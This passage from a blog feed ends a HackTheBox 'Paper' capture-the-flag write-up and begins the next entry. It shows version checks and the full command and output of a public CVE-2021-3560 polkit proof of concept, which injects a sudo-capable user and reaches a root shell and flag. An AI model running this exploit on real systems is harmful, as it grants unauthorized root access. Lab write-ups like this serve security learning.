+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.29
+
+Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id &amp;quot;failovermethod&amp;quot; does not exist
+Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id &amp;quot;failovermethod&amp;quot; does not exist
+Modular dependency problems:
+
+Problem 1: conflicting requests
+  - nothing provides module(perl:5.26) needed by module perl-IO-Socket-SSL:2.066:8030020201222215140:1e4bbb35.x86_64
+Problem 2: conflicting requests
+  - nothing provides module(perl:5.26) needed by module perl-libwww-perl:6.34:8030020201223164340:b967a9a2.x86_64
+Vulnerable to CVE-2021-3560
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Of course, running a later version does not show the box as vulnerable to the
+CVE as &lt;code&gt;yum list installed | grep polkit&lt;/code&gt; return an empty string.
+Nonetheless the box is vulnerable to it. This information can be found using
+directly &lt;code&gt;rmp&lt;/code&gt; to list the package and looking at the &lt;code&gt;polkit&lt;/code&gt; version (v0.113
+to v0.118 are vulnerable).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[dwight@paper ~]$ rpm -qa|grep -i polkit
+polkit-0.115-6.el8.x86_64
+polkit-pkla-compat-0.1-12.el8.x86_64
+polkit-libs-0.115-6.el8.x86_64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Polkit&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/"&gt;The Polkit exploit&lt;/a&gt;
+is largely documented but as it is race condition it need to be performed
+quickly. Moreover the box author used a cleanup mechanism that regularly (2
+minutes) rewrite the &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/shadow&lt;/code&gt; files. The box author
+developed a &lt;a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/"&gt;script, publish on github&lt;/a&gt;
+that automate this process. We can run the &lt;code&gt;poc.sh&lt;/code&gt; on the box and &lt;code&gt;switch user&lt;/code&gt;
+as &lt;code&gt;secnimga&lt;/code&gt; and then &lt;code&gt;sudo bash&lt;/code&gt; to get a root shell and get the flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[dwight@paper ~]$ sh poc.sh -t=0.002 &amp;amp;&amp;amp; su secnigma
+
+[!] Username set as : secnigma
+[!] Timing set to : 0.002
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as &amp;quot;centos&amp;quot;
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username secnigma  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using sudo - secnigma
+[!] When prompted for password, enter your password
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter &amp;#39;sudo bash&amp;#39; and drop into a root shell!
+Password:
+[secnigma@paper dwight]$ id
+uid=1005(secnigma) gid=1005(secnigma) groups=1005(secnigma),10(wheel)
+[secnigma@paper dwight]$ sudo bash
+[sudo] password for secnigma:
+[root@paper dwight]# cat^C
+[root@paper dwight]# cd
+[root@paper ~]# cd /root/
+[root@paper ~]# cat root.txt
+254b5756cdc3dfa2cc7ff4703e76758d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;Overall a great realistic box with a lot of interaction and different
+vulnerabilities for the user part.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Wordpress"></category><category term="CVE-2019-17671 (wordpress)"></category><category term="CVE-2021-3560 (polkit)"></category></entry><entry><title>HTB: Meta</title><link href="https://maggick.fr/2022/06/htb-meta.html" rel="alternate"></link><published>2022-06-12T13:50:00+02:00</published><updated>2022-06-12T13:50:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-06-12:/2022/06/htb-meta.html</id><summary type="html">&lt;p&gt;&lt;img alt="Meta card" class="align-left" src="/media/2022.06/meta_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.com/home/machines/profile/429"&gt;Meta&lt;/a&gt; publish on
 January 22, 2022 by
